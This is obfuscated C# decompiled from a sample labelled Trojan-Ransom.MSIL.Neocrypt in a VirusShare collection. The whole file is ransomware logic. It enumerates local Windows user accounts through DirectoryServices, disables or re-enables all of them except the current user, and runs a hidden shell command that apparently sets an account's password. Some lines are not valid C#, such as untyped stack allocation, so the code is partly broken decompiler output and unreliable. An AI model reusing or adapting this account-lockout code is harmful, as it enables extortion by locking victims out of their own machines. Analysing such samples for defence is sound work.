// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Output, Version=1.1.0.0, Culture=neutral, PublicKeyToken=679946a7cf437fcb
// MVID: 86897229-7BC6-4141-B9B1-66C325C24A9D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.MSIL.Neocrypt.d-9ac5e14466821854f24f31402e9e3cdf97e476fcd0edf111aab0d7189ab5e577.exe

using \u0003;
using \u0006;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.DirectoryServices;

namespace \u0006
{
  internal class \u0001
  {
    private static string \u0001;
    private static string \u0002;
    private static string \u0003;
    private static string \u0004;
    private static List<string> \u0001;
    [NonSerialized]
    internal static \u0003.\u0006 \u001F;

    static \u0001()
    {
      Type type = typeof (\u0001);
      if (true)
        goto label_2;
label_1:
      \u0001.\u0001 = \u0001.\u001F(2805);
      \u0001.\u0002 = \u0001.\u001F(2818);
      \u0001.\u0003 = \u0001.\u001F(2827);
      \u0001.\u0004 = \u0001.\u001F(2872);
      \u0001.\u0001 = \u0001.\u0001(\u001F.\u0087\u0002());
      return;
label_2:
      \u0007.\u0001(type);
      goto label_1;
    }

    public static void \u0001(string username, string password)
    {
      int num = \u008B\u0002.\u0004\u0004(\u008A\u0002.\u0003\u0004(\u0001.\u001F(2917), username, \u0001.\u001F(2930), password), AppWinStyle.MinimizedFocus, false, -1);
    }

    public static void \u0001()
    {
      List<string>.Enumerator enumerator1;
      try
      {
        if (true)
        {
          List<string>.Enumerator enumerator2 = \u0001.\u0001.GetEnumerator();
          if (true)
          {
            enumerator1 = enumerator2;
            goto label_4;
          }
          else
            goto label_4;
        }
label_3:
        string current;
        if (\u0015.\u001A\u0002(current, \u001F.\u0088\u0002(), false) != 0)
          \u0001.\u0001(current, false);
label_4:
        if (!enumerator1.MoveNext())
          return;
        current = enumerator1.Current;
        goto label_3;
      }
      finally
      {
        enumerator1.Dispose();
      }
    }

    public static void \u0002()
    {
      List<string>.Enumerator enumerator1;
      try
      {
        if (true)
        {
          List<string>.Enumerator enumerator2 = \u0001.\u0001.GetEnumerator();
          if (true)
          {
            enumerator1 = enumerator2;
            goto label_4;
          }
          else
            goto label_4;
        }
label_3:
        string current;
        if (\u0015.\u001A\u0002(current, \u001F.\u0088\u0002(), false) != 0)
          \u0001.\u0001(current, true);
label_4:
        if (!enumerator1.MoveNext())
          return;
        current = enumerator1.Current;
        goto label_3;
      }
      finally
      {
        enumerator1.Dispose();
      }
    }

    public static unsafe string \u0001(string userIdentity, bool accountActive)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(20);
      DirectoryEntry directoryEntry1 = \u0001.\u0001();
      string str1 = \u0001.\u0002;
      string str2;
      if (true)
        str2 = str1;
      if (directoryEntry1 != null)
        goto label_9;
label_6:
      \u0013.\u007E\u0004\u0002((object) directoryEntry1);
      \u0013.\u007E\u0001\u0002((object) directoryEntry1);
      return str2;
label_9:
      if (\u0001.\u0001(userIdentity))
      {
        try
        {
          DirectoryEntry directoryEntry2 = \u008D\u0002.\u007E\u0006\u0004((object) \u008C\u0002.\u007E\u0005\u0004((object) directoryEntry1), userIdentity, \u0001.\u001F(2935));
          *(int*) ((IntPtr) voidPtr + 4) = 512;
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 4);
          *(int*) ((IntPtr) voidPtr + 8) = 64;
          *(int*) voidPtr = 65536;
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 4) | *(int*) voidPtr | *(int*) ((IntPtr) voidPtr + 8);
          if (!accountActive)
          {
            *(int*) ((IntPtr) voidPtr + 16) = 2;
            *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) | *(int*) ((IntPtr) voidPtr + 16);
          }
          object obj = \u008E\u0002.\u007E\u0007\u0004((object) directoryEntry2, \u0001.\u001F(2944), new object[2]
          {
            (object) \u0001.\u001F(2949),
            (object) *(int*) ((IntPtr) voidPtr + 12)
          });
          \u0013.\u007E\u0003\u0002((object) directoryEntry2);
          str2 = \u0001.\u0001;
          \u0013.\u007E\u0004\u0002((object) directoryEntry2);
          \u0013.\u007E\u0001\u0002((object) directoryEntry2);
          goto label_6;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          Exception exception = ex;
          str2 = \u0011.\u007E\u0099((object) exception);
          \u008E.\u0099\u0002();
          goto label_6;
        }
      }
      else
      {
        str2 = \u0001.\u0003;
        goto label_6;
      }
    }

    private static unsafe bool \u0001(string userIdentity)
    {
      void* voidPtr;
      DirectoryEntry directoryEntry;
      if (true)
      {
        // ISSUE: untyped stack allocation
        voidPtr = (void*) __untypedstackalloc(2);
        directoryEntry = \u0001.\u0001();
        *(sbyte*) voidPtr = (sbyte) 0;
        if (directoryEntry != null)
        {
          try
          {
            if (\u008D\u0002.\u007E\u0006\u0004((object) \u008C\u0002.\u007E\u0005\u0004((object) directoryEntry), userIdentity, \u0001.\u001F(2935)) == null)
              goto label_4;
label_3:
            *(sbyte*) voidPtr = (sbyte) 1;
label_4:
            if (true)
            {
              if (false)
                goto label_3;
            }
            else
              goto label_3;
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            if (true)
              *(sbyte*) voidPtr = (sbyte) 0;
            \u008E.\u0099\u0002();
          }
        }
      }
      if (true)
        \u0013.\u007E\u0004\u0002((object) directoryEntry);
      \u0013.\u007E\u0001\u0002((object) directoryEntry);
      *(sbyte*) ((IntPtr) voidPtr + 1) = *(sbyte*) voidPtr;
      if (false)
        ;
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 1);
    }

    private static DirectoryEntry \u0001()
    {
      DirectoryEntry directoryEntry1;
      if (true)
      {
        DirectoryEntry directoryEntry2;
        try
        {
          string str = \u008F\u0002.\u0008\u0004(\u0001.\u001F(2962), \u001F.\u0087\u0002(), \u0001.\u001F(2975));
          string path;
          if (true)
            path = str;
          do
          {
            do
            {
              directoryEntry2 = new DirectoryEntry(path);
            }
            while (false);
          }
          while (false);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          directoryEntry2 = (DirectoryEntry) null;
          if (true)
            \u008E.\u0099\u0002();
        }
        directoryEntry1 = directoryEntry2;
      }
      return directoryEntry1;
    }

    public static List<string> \u0001(string MachineName)
    {
      List<string> stringList1;
      do
      {
        DirectoryEntry directoryEntry1 = new DirectoryEntry(\u0001.\u001F(2962) + MachineName);
        if (true)
          goto label_16;
label_1:
        if (true)
          goto label_17;
label_14:
        continue;
label_17:
        List<string> stringList2 = new List<string>();
        IEnumerator enumerator;
        DirectoryEntry directoryEntry2;
        try
        {
          enumerator = directoryEntry2.Children.GetEnumerator();
          if (true)
            goto label_8;
label_7:
          DirectoryEntry current;
          stringList2.Add(current.Name);
label_8:
          int num;
          for (int index = enumerator.MoveNext() ? 1 : 0; index != 0; index = num)
          {
            if (true)
            {
              current = (DirectoryEntry) enumerator.Current;
              num = Operators.CompareString(current.SchemaClassName, \u0001.\u001F(2988), false);
              if (true)
              {
                if (num != 0)
                  goto label_8;
                else
                  goto label_7;
              }
            }
            else
              goto label_8;
          }
        }
        finally
        {
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
        do
        {
          stringList1 = stringList2;
        }
        while (false);
        goto label_14;
label_16:
        directoryEntry2 = directoryEntry1;
        goto label_1;
      }
      while (false);
      return stringList1;
    }
  }
}
